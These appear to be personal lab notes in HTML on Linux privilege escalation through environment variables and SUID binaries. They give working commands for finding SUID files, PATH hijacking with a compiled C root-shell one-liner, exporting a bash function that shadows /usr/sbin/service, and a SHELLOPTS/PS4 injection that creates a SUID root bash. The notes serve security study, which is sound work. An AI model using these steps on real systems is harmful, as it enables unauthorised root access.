<!DOCTYPE html  PUBLIC '-//W3C//DTD XHTML 1.0 Transitional//EN'  'http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd'><html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta content="text/html; charset=utf-8" http-equiv="Content-Type"/>
<title>Envionrmental variables</title>
</head><body>Escalation via envionrmental variables.<br/>
<br/>
Enviornmental veariables are system wide and inherrited by all process and shells<br/>
<br/>
Look for Environmental varaibles with<br/>
<br/>
<b>env</b><br/>
<br/>
PATH is a very standard env<br/>
<br/>
Maliciously we want to modify an environmental variable taking advantage of a file with a SUID bit set<br/>
<br/>
Start by using the standard permission find command<br/>
<br/>
<b>find / -type f -perm -04000 -ls 2&gt;/dev/null</b><br/>
<br/>
outputs sbit set binaries.<br/>
<br/>
<img src="image.png"/><br/>
<br/>
<br/>
Find a potential with s bits set... run it and check for behaviour.<br/>
<br/>
<img src="image 2.png"/><br/>
<br/>
<img src="image 3.png"/><br/>
<br/>
you can get more info running strings<br/>
<br/>
strings &lt;file&gt;<br/>
<br/>
<img src="image 4.png"/><br/>
***Screen shot example is for different type of file requiring differnt payload. In this example the strings identified itss calling a direct path.. so to exploit you need to create a malicious function.<br/>
<img height="40" src="image 5.png" width="750"/><br/>
<br/>
<img height="78" src="image 6.png" width="750"/><br/>
<br/>
<br/>
TLDR of attack<br/>
<br/>
find an explopitable file... the system would check the environemtnal variable.. Potetnially PATH, when its run. Insert a malicious file and modify PATH to point to your malicious file..<br/>
<br/>
Create a malicious 1 liner<br/>
<br/>
<br/>
syntax &gt; <b>echo 'int main() {setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return }' &gt; /tmp/service.c</b><br/>
<br/>
No compile the c code<br/>
<br/>
<b>gcc /tmp/service.c -o /tmp/service</b><br/>
<br/>
Now we need to modify path to also point to our malicious file location<br/>
<br/>
<b>export PATH=/tmp:$PATH</b><br/>
<br/>
Printing path before and then after this command will show that /tmp is now added and called first<br/>
<br/>
From here running the vulnarble SUID file will grant root.<br/>
<br/>
<br/>
BIG NOTE. If its just calling the serivce. the malicious c code wtih path modification is the easier win. <br/>
If its calling a complete path then use the additonal method in the screen shots<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: find / -type f -perm -04000 -ls 2&gt;/dev/null<br/>
2. From the output, make note of all the SUID binaries.<br/>
3. In command prompt type: strings /usr/local/bin/suid-env<br/>
4. From the output, notice the functions used by the binary.<br/>
<br/>
Exploitation<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
echo 'int main() { setgid(0); setuid(0); system(&quot;/bin/bash&quot;); return 0; }' &gt; /tmp/service.c<br/>
2. In command prompt type: gcc /tmp/service.c -o /tmp/service<br/>
3. In command prompt type: export PATH=/tmp:$PATH<br/>
4. In command prompt type: /usr/local/bin/suid-env<br/>
5. In command prompt type: id<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
Detection<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type: find / -type f -perm -04000 -ls 2&gt;/dev/null<br/>
2. From the output, make note of all the SUID binaries.<br/>
3. In command prompt type: strings /usr/local/bin/suid-env2<br/>
4. From the output, notice the functions used by the binary.<br/>
<br/>
Exploitation Method #1<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
function /usr/sbin/service() { cp /bin/bash /tmp &amp;&amp; chmod +s /tmp/bash &amp;&amp; /tmp/bash -p; }<br/>
2. In command prompt type:<br/>
export -f /usr/sbin/service<br/>
3. In command prompt type: /usr/local/bin/suid-env2<br/>
<br/>
Exploitation Method #2<br/>
<br/>
Linux VM<br/>
<br/>
1. In command prompt type:<br/>
env -i SHELLOPTS=xtrace PS4='$(cp /bin/bash /tmp &amp;&amp; chown root.root /tmp/bash &amp;&amp; chmod +s /tmp/bash)' /bin/sh -c '/usr/local/bin/suid-env2; set +x; /tmp/bash -p'<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
<br/>
</body></html>